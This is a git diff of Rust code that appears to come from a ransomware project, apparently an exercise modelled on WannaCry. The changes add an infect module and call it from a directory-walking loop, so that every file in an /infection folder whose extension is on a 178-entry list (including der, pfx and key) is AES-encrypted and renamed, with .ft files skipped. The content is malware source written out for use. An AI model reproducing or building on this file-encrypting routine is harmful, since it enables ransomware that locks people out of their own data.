@@ -1,7 +1,14 @@
+pub mod infect;
 use std::fs::{
     read_dir,
     ReadDir,
     DirBuilder
+};
+use std::path::PathBuf;
+use crate::tools::Flags;
+use infect::{
+    rename_infect,
+    infect
 };
 
 pub fn create_folder_infection(path: &String) -> bool {
@@ -55,8 +62,9 @@ pub fn accepted_type_file(arr: &[&str; 178], extension: &str) -> bool {
     false
 }
 
-/* Infection part */
-fn infect(res_dir: Result<ReadDir, std::io::Error>) {
+/* Start Infection part */
+fn start_infect(res_dir: Result<ReadDir, std::io::Error>,
+    list: &Flags) {
     let arr: [&str; 178] = ["der",
     "pfx",
     "key",
@@ -246,13 +254,15 @@ fn infect(res_dir: Result<ReadDir, std::io::Error>) {
         Ok(dir) => {
             for i in dir {
                 if let Ok(a) = i{
-                    let path = a.path();
+                    let path: PathBuf = a.path();
                     if let Some(extension) = path.extension() {
                         if let Some(extension_str) = extension.to_str() {
                             println!("{extension_str}");
-                            if accepted_type_file(&arr, extension_str) {
+                            if extension_str != "ft" && accepted_type_file(&arr, extension_str) {
                                 //infect
+                                infect(list, &path);
                                 //rename
+                                rename_infect(&path);
                             }
                         }
                     }
@@ -270,9 +280,7 @@ fn infect(res_dir: Result<ReadDir, std::io::Error>) {
 //infect everything with accepted extensions from wannacry
 //  except ft named files
 //using AES
-pub fn start_encrypt() -> bool {
-    
-
+pub fn start_encrypt(list: &Flags) -> bool {
     let dir = get_infection_path(&"/infection".to_owned());
     let mut ret: bool = folder_exist(&dir);
     //println!("{:?}", dir.unwrap());
@@ -280,6 +288,7 @@ pub fn start_encrypt() -> bool {
         ret = create_folder_infection(&"/infection".to_owned());
         return ret;
     }
-    infect(dir);
+    println!("abcd");
+    start_infect(dir, list);
     true
 }
